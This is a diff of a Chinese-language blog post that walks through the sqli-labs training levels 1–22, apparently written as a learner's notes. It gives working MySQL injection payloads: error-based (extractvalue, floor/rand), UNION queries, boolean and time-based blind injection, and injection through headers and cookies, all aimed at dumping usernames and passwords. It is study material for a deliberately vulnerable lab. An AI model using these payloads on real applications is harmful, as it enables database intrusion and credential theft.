@@ -7,15 +7,15 @@
   
   <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="sqli-libs 第一关第一步：输入?id&#x3D;1页面正常 第二步:在1后面加’ 第三步：报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)  第四步：获取数据库名:1’and(select extractval">
+  <meta name="description" content="sqli-libs第一关：报错注入：输入?id&#x3D;1页面正常在1后面加’报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)获取数据库名:1’and(select extractvalue(1,concat(0x7">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/2022/03/24/3.22/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="sqli-libs 第一关第一步：输入?id&#x3D;1页面正常 第二步:在1后面加’ 第三步：报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)  第四步：获取数据库名:1’and(select extractval">
+<meta property="og:description" content="sqli-libs第一关：报错注入：输入?id&#x3D;1页面正常在1后面加’报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)获取数据库名:1’and(select extractvalue(1,concat(0x7">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-03-24T10:00:32.770Z">
-<meta property="article:modified_time" content="2022-04-06T08:31:15.188Z">
+<meta property="article:modified_time" content="2022-04-08T07:44:45.087Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -78,28 +78,29 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>sqli-libs</p>
-<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><p>输入?id=1页面正常</p>
-<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步:"></a>第二步:</h2><p>在1后面加’</p>
-<h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y) </p>
-<h2 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h2><p>获取数据库名:1’and(select extractvalue(1,concat(0x7e,(select database())))) –+</p>
-<h2 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h2><p>获取表名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))–+</p>
-<h2 id="第六步："><a href="#第六步：" class="headerlink" title="第六步："></a>第六步：</h2><p>获取列名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”users”))))–+</p>
-<h2 id="第七步："><a href="#第七步：" class="headerlink" title="第七步："></a>第七步：</h2><p>获取数据值:1’and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,0x3a,password) from users where username not in(‘Dumb’)))))–+!</p>
-<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p>第二关与第一关差别不大，只需要在报错后去掉 ‘ 即可，其余不变</p>
-<h2 id="第一步：-1"><a href="#第一步：-1" class="headerlink" title="第一步："></a>第一步：</h2><p>输入?id=1页面正常</p>
-<h2 id="第二步-1"><a href="#第二步-1" class="headerlink" title="第二步:"></a>第二步:</h2><p>在1后面加  ‘  ，页面报错</p>
-<h2 id="第三步：-1"><a href="#第三步：-1" class="headerlink" title="第三步："></a>第三步：</h2><p>报错注入：在后面加上 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y) </p>
-<h2 id="第四步：-1"><a href="#第四步：-1" class="headerlink" title="第四步："></a>第四步：</h2><p>获取数据库名：and(select extractvalue(1,concat(0x7e,(select database())))) –+</p>
-<h2 id="第五步：-1"><a href="#第五步：-1" class="headerlink" title="第五步："></a>第五步：</h2><p>获取表名:and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))–+</p>
-<h2 id="第六步：-1"><a href="#第六步：-1" class="headerlink" title="第六步："></a>第六步：</h2><p>获取列名:and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”users”))))–+</p>
-<h2 id="第七步：-1"><a href="#第七步：-1" class="headerlink" title="第七步："></a>第七步：</h2><p>获取数据值：and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,0x3a,password) from users where username not in(‘Dumb’)))))–+</p>
+        <p>sqli-libs<br>第一关：<br>报错注入：<br>输入?id=1页面正常<br>在1后面加’<br>报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)<br>获取数据库名:1’and(select extractvalue(1,concat(0x7e,(select database())))) –+<br>获取表名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))–+<br>获取列名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”users”))))–+<br>获取数据值:1’and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,0x3a,password) from users where username not in(‘Dumb’)))))–+</p>
+<p>联合查询：<br>union select 1,2,database()–+ 查库<br>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+查表<br>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users” –+ 查列<br>union select 1,group_concat(username),group_concat(password) from users –+  查数据</p>
+<p>第二关：<br>第二关与第一关差别不大，只需要在报错后去掉 ‘ 即可，其余不变</p>
 <p>第三关:<br>与第一关差别不大，只需要在1’后加上)即可，其余不变</p>
 <p>第四关：<br>同前三关一样 只需要把第三关的单引号变成双引号</p>
 <p>第五关：<br>采用报错注入，需要双注入，?id=-1’,其余同前四关一致</p>
 <p>第六关：<br>将第五关的单引号变成双引号即可</p>
 <p>第七关：<br>不知道</p>
-<p>第八关：<br>采用布尔盲注<br>获取数据库名<br>‘ and substr(database(),1,1)= “a” –+  security<br>获取表名<br>‘ and substr((select table_name from information_schema。tables where table_schema=’security’ limit x,1),1,1)=’a’–+  x为第几个表，第一个表是referer,第三个表是users<br>获取列名<br>‘ and substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),1,8)=’a’–+   x同上,第一列是username,第二列是password<br>获取数据<br>‘ and substr((select username from users limit 0,1),1,1)=’a’–+   dumb<br>‘ and substr((select password from users limit 0,1),1,1)=’a’–+   dumb</p>
+<p>第八关：<br>采用布尔盲注<br>获取数据库名<br>‘ and substr(database(),1,1)= “a” –+  security<br>获取表名<br>‘ and substr((select table_name from information_schema。tables where table_schema=’security’ limit x,1),1,1)=’a’–+  x为第几个表，第一个表是referer,第三个表是users，第二个表是uagents<br>获取列名<br>‘ and substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),1,8)=’a’–+   x同上,第一列是username,第二列是password<br>获取数据<br>‘ and substr((select username from users limit 0,1),1,1)=’a’–+   dumb<br>‘ and substr((select password from users limit 0,1),1,1)=’a’–+   dumb</p>
+<p>第九关：<br>采用时间盲注<br>注入<br>‘and sleep(5)–+<br>获取数据库名<br>‘ and if((substr((select database()),1,1)=’a’),sleep(10),1)–+  security<br>获取表名<br>‘ and if((substr((select table_name from information_schema.tables where table_schema=’security’ limit x,1),1,1)=’a’),sleep(10),1)–+   第三个为users<br>获取列名<br>‘ and if((substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),1,1)=’a’),sleep(10),1)–+  第一个为username,第二个password<br>获取数据<br>‘ and if((substr((select username from users limit 0,1),1,1)=’a’),sleep(10),1)–+<br>‘ and if((substr((select password from users limit 0,1),1,1)=’a’),sleep(10),1)–+<br>burp抓包可以看时间 f12点网络也可以看时间</p>
+<p>第十关：<br>同第九关采用时间盲注 只需要把 ‘ 变成 “即可</p>
+<p>第十一关:<br>输入admin admin登录 f12 hecbar不易观察 使用burp抓包在repeater<br>中更改post 在admin后加入’报错 采用报错注入即可</p>
+<p>第十二关：<br>与第十一关相同 只需要把注入改成”)即可</p>
+<p>第十三关：<br>同上 注入为’)</p>
+<p>第十四关：<br>同上 但需要注意注入语句和搜索语句需要在””内<br>例admin” and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)–+”</p>
+<p>第十五关：<br>注入位置不变 采用时间盲注<br>uname=admin’ and if((substr((select database()),1,1)=’a’),sleep(10),1)–+</p>
+<p>第十六关：<br>同上 只需要把’变成”)</p>
+<p>第十七关：<br>注入位置变为passwd 需要注意最后的爆值正常语句不行 需要再加入一个select语句：and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from(select group_concat(id,username,password)from users))))–+</p>
+<p>第十八关：<br>登录后根据页面回显 猜测注入点在user-agent 直接尝试可行 需要注意单引号注入 把语句括在单引号内’ ‘</p>
+<p>第十九关：<br>登录后回显在referer 步骤同上18关</p>
+<p>第二十关：<br>根据页面猜测是cookies注入 尝试后可在cookies报错注入</p>
+<p>第二十一关：<br>同上 将’改为’) 将报错语句base64编码后即可 注意此关–+不行需要编码#</p>
+<p>第二十二关：<br>同上 将’)变为”就行</p>
 
       
     </div>
